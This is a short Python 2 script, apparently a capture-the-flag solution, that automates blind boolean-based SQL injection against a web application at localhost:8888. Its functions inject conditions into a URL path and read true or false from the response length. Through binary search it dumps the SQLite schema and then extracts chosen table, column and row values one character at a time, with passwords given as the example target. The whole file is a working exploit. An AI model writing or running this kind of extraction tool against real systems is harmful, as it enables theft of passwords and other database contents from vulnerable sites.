#!/usr/bin/python
from sys import argv, stdout
from urllib import quote
from urllib2 import urlopen

def log(s):
    stdout.write(s)
    stdout.flush()

# s: '1=1', '1=2'
def sql(s):
    url = 'http://localhost:8888/N0T.FLAG.BUT.PA55W0RD/'+quote("Alice' AND (%s) AND '1'='1"%s)
    n = len(urlopen(url).read())
    r = True if n == 100 else False if n == 104 else None
    return r

# query: 'SELECT length(password) FROM user_data LIMIT 0,1'
#        'SELECT count(*) FROM user_data'
def get_num(query, r=16):
    while not sql('(%s)<%d'%(query, r)):
        r *= 2
    r /= 2
    n = r/2
    while n > 0:
        if sql('(%s)<%d'%(query, r)):
            r -= n
        else:
            r += n
        n /= 2
    if not sql('(%s)=%d'%(query, r)):
        r -= 1
    return r

# query: 'SELECT %s FROM user_data LIMIT 0,1'
# field: 'password'
# index: 0, 1, 2, ...
def get_char(query, field, index):
    q = query%('unicode(substr(%s,%d,1))'%(field, index+1))
    r = chr(get_num(q, 128))
    log(r)
    return r

# query: 'SELECT %s FROM user_data LIMIT 0,1'
# field: 'password'
def get_cell(query, field):
    n = get_num(query%('length(%s)'%field, ))
    return ''.join(map(lambda i:get_char(query, field, i), range(n)))

if __name__ == '__main__':
    if len(argv) == 1:
        log('table num : ')
        table_num = get_num('SELECT count(name) FROM sqlite_master WHERE type=\'table\'')
        print table_num
        for i in range(table_num):
            log('table name: ')
            get_cell('SELECT %s FROM sqlite_master WHERE type=\'table\' LIMIT '+str(i)+',1', 'name')
            print
            log('table sql : ')
            get_cell('SELECT %s FROM sqlite_master WHERE type=\'table\' LIMIT '+str(i)+',1', 'sql')
            print
    else:
        T = argv[1]
        C = argv[2]
        N = int(argv[3])
        print 'table name :', T
        print 'column name:', C
        print 'row index  :', N
        log('data       : ')
        get_cell('SELECT %s FROM '+T+' LIMIT '+str(N)+',1', C)
        print
